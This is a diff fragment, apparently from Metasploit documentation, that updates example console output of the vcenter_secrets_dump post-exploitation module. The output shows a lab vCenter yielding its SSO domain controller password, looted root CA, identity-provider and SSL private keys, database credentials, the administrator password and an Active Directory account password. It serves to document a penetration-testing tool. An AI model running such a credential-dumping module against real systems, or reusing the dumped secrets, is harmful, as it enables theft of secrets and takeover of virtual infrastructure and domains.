@@ -54,19 +54,27 @@ session => 1
 msf6 post(linux/gather/vcenter_secrets_dump) > dump
 
 [*] Gathering vSphere SSO Domain Information ...
-[*] Extracting dcAccountDN and dcAccountPassword via lwregshell on local vCenter ...
-[+] vSphere SSO DC DN: cn=vcenter.cesium137.io,ou=Domain Controllers,dc=vsphere,dc=local
-[+] vSphere SSO DC PW: St"7qMYCj)V#PnwS\mw2
+[*] vSphere Hostname and IPv4: vcenteralpha.cesium137.io [192.168.100.11]
+[+] vSphere SSO DC DN: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local
+[+] vSphere SSO DC PW: .Awo;Z1Zwd>x_b=h1FQ'}
 [*] Extracting certificates from vSphere platform ...
-[*] Fetching objectclass=vmwSTSTenantCredential via vmdir LDAP ...
-[*] Parsing vmwSTSTenantCredential certificates and keys ...
-[*] Validated vSphere SSO IdP certificate against vSphere IDM tenant certificate
-[+] => CHA-CHING! <=
-[+] MACHINE_SSL_KEY: /home/cs137/.msf4/loot/20220417190437_default_192.168.100.11_ssl_120856.key
-[+] MACHINE_SSL_CERT: /home/cs137/.msf4/loot/20220417190437_default_192.168.100.11_ssl_144111.pem
-[+] VMCA_ROOT_KEY: /home/cs137/.msf4/loot/20220417190437_default_192.168.100.11_vmca_345006.key
-[+] VMCA_ROOT_CERT: /home/cs137/.msf4/loot/20220417190437_default_192.168.100.11_vmca_676785.pem
-[+] SSO_STS_IDP_KEY: /home/cs137/.msf4/loot/20220417190437_default_192.168.100.11_idp_668987.key
-[+] SSO_STS_IDP_CERT: /home/cs137/.msf4/loot/20220417190437_default_192.168.100.11_idp_126310.pem
+[+] VMCA_ROOT key: /root/.msf4/loot/20220427093946_default_192.168.100.11_vmca_509760.key
+[+] VMCA_ROOT cert: /root/.msf4/loot/20220427093946_default_192.168.100.11_vmca_797084.pem
+[+] SSO_STS_IDP key: /root/.msf4/loot/20220427093948_default_192.168.100.11_idp_105611.key
+[+] SSO_STS_IDP cert: /root/.msf4/loot/20220427093948_default_192.168.100.11_idp_779741.pem
+[+] MACHINE_SSL_CERT key: /root/.msf4/loot/20220427093949_default_192.168.100.11_ssl_410730.key
+[+] MACHINE_SSL_CERT cert: /root/.msf4/loot/20220427093950_default_192.168.100.11_ssl_759902.pem
+[+] DATA-ENCIPHERMENT key: /root/.msf4/loot/20220427093950_default_192.168.100.11_data_199784.key
+[+] DATA-ENCIPHERMENT cert: /root/.msf4/loot/20220427093951_default_192.168.100.11_data_119050.pem
+[*] Extracting PostgreSQL database credentials ...
+[+] VCDB Name: VCDB
+[+] VCDB User: vc
+[+] VCDB PW: my!h@)IN4jw$nHT{
+[*] Searching for secrets in VM Guest Customization Specification XML ...
+[*] Initial administrator account password found
+[+] Built-in administrator PW: Metasploit1$
+[*] AD domain join account found
+[+] AD User: administrator@cesium137.io
+[+] AD Pass: ThisIsSecret!
 [*] Post module execution completed
 ```
